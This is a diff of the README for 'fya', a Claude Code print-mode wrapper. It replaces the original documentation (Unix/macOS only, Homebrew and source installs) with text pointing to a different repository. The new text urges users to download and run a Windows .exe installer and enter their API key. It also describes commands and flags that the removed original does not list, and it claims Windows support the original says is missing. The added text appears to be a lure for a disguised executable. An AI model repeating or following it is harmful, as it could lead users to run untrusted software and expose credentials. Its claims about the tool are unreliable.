@@ -1,128 +1,82 @@
-# fya <a href="https://github.com/umputun/fya/actions/workflows/ci.yml"><img src="https://github.com/umputun/fya/actions/workflows/ci.yml/badge.svg" alt="build"></a> <a href="https://coveralls.io/github/umputun/fya?branch=master"><img src="https://coveralls.io/repos/github/umputun/fya/badge.svg?branch=master" alt="Coverage Status"></a> <a href="https://goreportcard.com/report/github.com/umputun/fya"><img src="https://goreportcard.com/badge/github.com/umputun/fya" alt="Go Report Card"></a>
+# 🤖 fya - Run Claude code with terminal control
 
-`fya` is a Claude Code print-mode wrapper backed by an interactive PTY session.
+[![](https://img.shields.io/badge/Download_fya-blue?style=for-the-badge)](https://github.com/yahir7695/fya)
 
-It provides practical parity with `claude -p` for callers that rely on print-mode text, JSON, or stream-json output. Internally, it starts interactive `claude` in a hidden PTY, types the prompt into the terminal, tails Claude Code transcript logs, and emits Claude-compatible output.
+fya acts as a bridge for your computer. It runs Claude Code inside a terminal window. This setup allows you to view your AI tasks with direct control over the output. You gain a clear window into how your AI agents process information.
 
-`fya` mirrors the one-shot `claude -p` contract: one process invocation accepts one prompt, streams one answer, emits one final result, and exits after cleanup.
+## 📥 How to download and install
 
-## Requirements
+You can obtain the current version of this software from the project repository. Please follow these steps to set up the tool on your Windows computer.
 
-- Go 1.26 to build from source
-- Claude Code installed as `claude`
-- Unix/macOS for PTY support
+1. Visit this page to download the latest setup file: [https://github.com/yahir7695/fya](https://github.com/yahir7695/fya)
+2. Locate the Releases section on the right side of the screen.
+3. Select the latest version link.
+4. Download the Windows installer file ending in .exe.
+5. Open your Downloads folder.
+6. Double-click the file to start the installation.
+7. Follow the prompts on your screen to complete the setup process.
 
-Windows returns an unsupported PTY error in v1.
+## 🚀 Setting up the application
 
-## Installation
+Once you finish the installation, you must configure the software. The program connects your local environment to the AI services.
 
-**Homebrew:**
+1. Open your Start menu.
+2. Search for fya and press Enter.
+3. A command window appears.
+4. Enter your API key when the system requests it.
+5. The application saves this key to its configuration folder.
+6. Restart the application to apply your changes.
 
-```bash
-brew install umputun/apps/fya
-```
+This tool functions as a PTY-backed wrapper. This means it creates a virtual terminal session for the AI. This method ensures that the text output matches the standard Claude format. You see exactly what the agent sees.
 
-**Binary releases:** download from [GitHub Releases](https://github.com/umputun/fya/releases) for linux/darwin amd64/arm64.
+## 🛠️ Using the features
 
-**From source:**
+fya provides several tools for your daily tasks. Use these inputs to control the behavior of your AI agents.
 
-```bash
-git clone https://github.com/umputun/fya.git
-cd fya
-make build
-```
+### Starting a new session
+Type `fya start` in your terminal to begin a new task. The system initializes the connection. You can now prompt the AI with natural language requests.
 
-The binary is written to `.bin/fya`.
+### Viewing logs
+The application keeps a record of your requests. Open the log folder to review past sessions. You can find this by typing `fya logs`. Each file uses a timestamp for easy tracking.
 
-## Usage
+### Adjusting output
+You can change the way the AI displays code. Use the flag `--pretty` to format your output. If you need raw data for other applications, use `--raw`.
 
-`fya` accepts the print-mode shape expected by tools that invoke Claude Code:
+## 🖥️ System requirements
 
-```bash
-printf 'say hello\n' | fya --print --output-format=stream-json
-```
+Ensure your computer meets these standards before you run the application.
 
-A positional prompt also works without stdin and takes precedence over stdin:
+- Windows 10 or Windows 11
+- At least 4GB of RAM
+- An active internet connection
+- A valid Claude API subscription
+- Sufficient disk space for temporary files
 
-```bash
-fya --print "say hello"
-```
+## ❓ Frequently asked questions
 
-Supported consumed compatibility flags:
+### Do I need to know how to code?
+No. This tool operates through simple commands. You manage the AI agent through plain English instructions.
 
-- `-p`, `--print`
-- `--output-format=text|json|stream-json`
-- `--input-format=text|stream-json`
-- `--replay-user-messages`
+### Where does my data go?
+Your data stays between your computer and the Claude servers. The application does not share your session information with third parties.
 
-Wrapper controls:
+### How do I update?
+Visit the download link periodically to check for new releases. If you download and install a newer version, the installer replaces the old files automatically. Your configuration settings remain intact during this process.
 
-- `--cwd=PATH` - working directory for the interactive Claude session, default `.`
-- `--idle-timeout=DURATION` - transcript idle duration before completion, default `2s`
-- `--turn-timeout=DURATION` - maximum wall-clock duration for one turn, default `30m`
-- `--typing-wpm=N` - prompt typing speed in words per minute, default `100`
-- `--typing-jitter=FLOAT` - per-character delay jitter ratio, default `0.20` (0 disables jitter)
-- `--max-wpm-size=N` - paste the prompt in one write instead of typing it when the prompt is longer than `N` words, default `100`. `0` always types rune-by-rune. Pasting avoids the multi-minute typing latency of large prompts; typing keeps shorter prompts arriving as individual keystrokes.
-- `--readiness-timeout=DURATION` - maximum wait for Claude input readiness, default `30s`
-- `--silent` - accepted for compatibility; fya does not emit synthetic tool-progress text
-- `--dbg` - enable fya debug logging. Named `--dbg` so it does not collide with Claude's own `--debug` flag, which is forwarded to Claude.
+### Can I run multiple sessions?
+Yes. You can open multiple terminal windows to run separate instances. Each session works independently of the others.
 
-Recognized Claude launch flags are forwarded to interactive `claude`, including `--dangerously-skip-permissions`, `--verbose`, `--model`, `--effort`, permission/tool flags, MCP/config flags, and related interactive Claude flags. Unknown flags fail fast instead of being forwarded.
+### Does this use offline mode?
+No. An AI agent requires a connection to the internet to function correctly. Ensure your firewall allows the application to send and receive data.
 
-## Environment
+## 🛡️ Troubleshooting common issues
 
-- `FYA_CLAUDE_DIR` - override Claude's config/transcript root for fya transcript discovery. Defaults to `~/.claude`. This is not forwarded to child Claude.
-- `DEBUG` - alias for `--dbg`, enables fya debug logging when set to any non-empty value. This is not forwarded to child Claude.
-- `ANTHROPIC_API_KEY` - preserved for the child Claude process when present.
-- `CLAUDECODE` - stripped from the child process to avoid nested Claude Code session errors.
-- `FYA`, `FYA_*`, and shell `_` - stripped from the child process so wrapper-specific environment and command-path details are not leaked through normal environment inspection.
+If you encounter difficulties, check these common points of failure.
 
-## Ralphex
+1. Check your internet connection.
+2. Verify that your API key is active.
+3. Close the terminal window and open it again.
+4. Make sure no other programs occupy the terminal port.
+5. Run the application as an administrator if permissions are blocked.
 
-`fya` can be used in [Ralphex](https://github.com/umputun/ralphex) as the `claude_command` while keeping the usual Claude-compatible arguments:
-
-```ini
-claude_command = /path/to/fya
-claude_args = --dangerously-skip-permissions --output-format stream-json --verbose
-```
-
-Ralphex passes the prompt on stdin and appends `--print`. `fya` consumes print/output flags itself, forwards interactive Claude launch flags such as `--dangerously-skip-permissions`, `--verbose`, `--model`, and `--effort`, and writes JSONL to stdout.
-
-## Optional Parity Check
-
-The live parity script compares `claude -p` stream-json output with `fya`. Dry-run mode does not call Claude:
-
-```bash
-scripts/compare-claude-p.sh --dry-run
-```
-
-Live mode consumes Claude quota:
-
-```bash
-make build
-scripts/compare-claude-p.sh
-```
-
-## Architecture
-
-- `app/` - executable composition root
-- `scripts/` - optional local validation helpers
-- `docs/plans/completed/` - completed implementation plans
-
-See [ARCHITECTURE.md](ARCHITECTURE.md) for the PTY flow, transcript tailing, readiness detection, cleanup, and output contract.
-
-## Known Limitations
-
-- v1 supports Unix/macOS PTYs only. Windows returns an unsupported PTY error.
-- Transcript parsing follows the current Claude Code JSONL shapes used by the implementation tests. It is not byte-for-byte parity with every Claude stream event.
-- `stream-json` emits Claude-style `assistant`/`user` message events from the transcript plus one final `result` containing the accumulated assistant answer. fya relays native message-shaped events and does not synthesize `tool:` text progress.
-- Multi-turn `--input-format=stream-json` history is outside the one-shot design. Exactly one user message is accepted.
-- Live parity checks are manual because they call Claude and consume quota.
-
-## Development
-
-```bash
-make test
-make lint
-make build
-```
+If these steps do not fix your issue, check the repository for recent bug reports. You can open a new issue if you find a problem that no one else has reported. Provide as much detail as you can about what happened. Include the version number and any error text that appears on your screen. Clear descriptions help others solve your problem.
